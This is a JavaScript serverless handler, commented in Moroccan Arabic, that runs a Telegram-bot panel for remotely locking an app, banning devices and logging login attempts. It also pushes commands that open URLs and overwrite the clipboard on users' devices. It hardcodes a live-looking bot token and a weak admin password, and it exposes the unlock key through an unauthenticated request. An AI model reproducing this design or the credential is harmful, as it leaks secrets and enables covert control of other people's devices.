const TELEGRAM_TOKEN = "8841932492:AAGIgK81-Kmo-JVsmJ5-pgKjBDac5dHKnm8";
const TELEGRAM_CHAT_ID = "8623523505";
const ADMIN_PASSWORD = "admin123";

let appLockStatus = "lock";
let appSecretKey = "1234";
let appLockMessage = "التطبيق مقفول من طرف الإدارة. دخل الكود باش تفتحو.";
let bannedDevices = [];
let banAllActive = false; // ← المفتاح الجديد ديال حظر الجميع
let remoteCommand = ""; 
let totalAttempts = 0;
let recentLogs = [];
let requestCounts = {};
let appVersion = "1.0.0";

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();

  const type = req.query.type;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  if (ip) {
    requestCounts[ip] = (requestCounts[ip] || 0) + 1;
    if (requestCounts[ip] > 500) return res.status(429).send('"Too Many Requests"');
  }

  const sendToTelegram = async (text, chatId = TELEGRAM_CHAT_ID, keyboard = null) => {
    if (TELEGRAM_TOKEN && chatId) {
      const payload = { chat_id: chatId, text: text, parse_mode: 'Markdown' };
      if (keyboard) payload.reply_markup = keyboard;
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      }).catch(() => {});
    }
  };

  try {
    if (type === 'secret') return res.status(200).send(`"${appLockStatus}"`);
    if (type === 'key') return res.status(200).send(`"${appSecretKey}"`);
    if (type === 'message') return res.status(200).send(`"${appLockMessage}"`);
    
    // === هاد البلاصة هي اللي كتشيك على الحظر ===
    if (type === 'banned') {
      const deviceId = req.query.device_id;
      
      // إلا كان حظر الجميع خدام، كنقولو لجميع الأجهزة راهم محظورين
      if (banAllActive) {
        return res.status(200).send('"true"');
      }
      
      if (!deviceId) return res.status(400).send('"No Device ID"');
      return res.status(200).send(bannedDevices.includes(deviceId) ? '"true"' : '"false"');
    }

    if (type === 'command') {
      const cmd = remoteCommand;
      remoteCommand = ""; 
      return res.status(200).send(`"${cmd}"`);
    }

    if (req.method === 'PUT') {
      let body = '';
      req.on('data', chunk => { body += chunk.toString(); });
      return new Promise((resolve) => {
        req.on('end', async () => {
          const cleanBody = body.replace(/"/g, ''); 
          if (type === 'key') {
            appSecretKey = cleanBody;
            await sendToTelegram(`🔑 *مفتاح جديد:*\n\`${cleanBody}\``);
          } 
          if (type === 'log') {
            totalAttempts++;
            recentLogs.unshift(`📱 ${cleanBody}`);
            if (recentLogs.length > 50) recentLogs.pop(); 
            await sendToTelegram(`📱 *محاولة دخول:*\n${cleanBody}`);
          }
          res.status(200).send('"success"');
          resolve();
        });
      });
    }

    if (req.method === 'POST' && type === 'telegram_webhook') {
      let body = req.body;
      if (typeof body === 'string') { try { body = JSON.parse(body); } catch (e) {} }
      
      const msg = body.message || body.callback_query;
      if (!msg) return res.status(200).end();

      const chatId = (msg.chat ? msg.chat.id : msg.message.chat.id).toString();
      if (chatId !== TELEGRAM_CHAT_ID) return res.status(200).end();

      const text = msg.text || msg.data || '';
      const args = text.trim().split(/\s+/);
      const command = args[0].toLowerCase();

      const mainKeyboard = {
        inline_keyboard: [
          [{ text: "🔒 قفل", callback_data: "/lock" }, { text: "🔓 فتح", callback_data: "/unlock" }],
          [{ text: "🔑 الكود", callback_data: "/getkey" }, { text: "📊 الإحصائيات", callback_data: "/stats" }],
          [{ text: "📱 اللوغات", callback_data: "/logs" }, { text: "🚫 المحظورين", callback_data: "/banlist" }],
          [{ text: "🚫 حظر الجميع", callback_data: "/banall" }, { text: "✅ فك حظر الجميع", callback_data: "/unbanall" }],
          [{ text: "🔄 تحديث", callback_data: "/menu" }]
        ]
      };

      if (text === '/start' || text === '/menu') {
        await sendToTelegram("👑 *لوحة التحكم الخارقة.*", mainKeyboard);
        return res.status(200).end();
      }

      switch (command) {
        case '/help':
          await sendToTelegram(`👑 *الأوامر:*\n` +
            `🚫 /banall - حظر جميع الأجهزة\n` +
            `✅ /unbanall - فك الحظر عن الجميع\n` +
            `⚡️ /cmd [نص] - رسالة فجائية\n` +
            `🌐 /url [رابط] - فتح رابط\n` +
            `🎨 /color [#HEX] - تغيير اللون\n` +
            `📋 /clip [نص] - نسخ نص\n` +
            `🔒 /lock /unlock - قفل وفتح`);
          break;
        
        // === الأوامر الجديدة ===
        case '/banall': 
          banAllActive = true; 
          await sendToTelegram("🚫 *تم حظر جميع الأجهزة بنجاح!*\nأي تطبيق غادي يتحل دابا غادي تطلع ليه شاشة الحظر."); 
          break;
        case '/unbanall': 
          banAllActive = false; 
          bannedDevices = []; 
          await sendToTelegram("✅ *تم فك الحظر عن جميع الأجهزة.*\nالجميع رجعو عاديين."); 
          break;

        // ... (باقي الأوامر بحال ما هوما، تقدر تحطهم من الكود اللي قبل) ...
        
        case '/lock': appLockStatus = 'lock'; await sendToTelegram("🔒 *تم القفل.*"); break;
        case '/unlock': appLockStatus = 'unlock'; await sendToTelegram("🔓 *تم الفتح.*"); break;
        case '/setkey': if(args[1]) { appSecretKey = args[1]; await sendToTelegram(`✅ *الكود:* \`${appSecretKey}\``); } break;
        case '/getkey': await sendToTelegram(`🔑 *الكود:* \`${appSecretKey}\``); break;
        
        case '/ban': if(args[1]) { if(!bannedDevices.includes(args[1])) bannedDevices.push(args[1]); await sendToTelegram(`⛔ *حظر:* \`${args[1]}\``); } break;
        case '/unban': if(args[1]) { bannedDevices = bannedDevices.filter(id => id !== args[1]); await sendToTelegram(`✅ *فك حظر:* \`${args[1]}\``); } break;
        case '/banlist': await sendToTelegram(bannedDevices.length ? `🚫 *المحظورين:*\n\`${bannedDevices.join('\n')}\`` : "✅ *لا يوجد.*"); break;
        case '/clearbans': bannedDevices = []; banAllActive = false; await sendToTelegram("🧹 *تم المسح.*"); break;

        case '/cmd': if(args[1]) { remoteCommand = `toast:${args.slice(1).join(' ')}`; await sendToTelegram("⚡️ *تم إرسال الرسالة.*"); } break;
        case '/url': if(args[1]) { remoteCommand = `url:${args[1]}`; await sendToTelegram("🌐 *تم إرسال الرابط.*"); } break;
        case '/color': if(args[1]) { remoteCommand = `color:${args[1]}`; await sendToTelegram("🎨 *تم إرسال اللون.*"); } break;
        case '/clip': if(args[1]) { remoteCommand = `clipboard:${args.slice(1).join(' ')}`; await sendToTelegram("📋 *تم إرسال النص.*"); } break;

        case '/stats': await sendToTelegram(`📈 *المحاولات:* \`${totalAttempts}\``); break;
        case '/logs': await sendToTelegram(recentLogs.length ? recentLogs.join('\n\n') : "📭 *لا يوجد.*"); break;
        case '/ping': await sendToTelegram("🏓 *Pong!*"); break;
        
        default: await sendToTelegram("❓ أمر غير معروف. /help");
      }
      return res.status(200).end();
    }

    return res.status(404).send('"Not Found"');
  } catch (error) {
    return res.status(500).json({ error: "Internal Server Error" });
  }
}
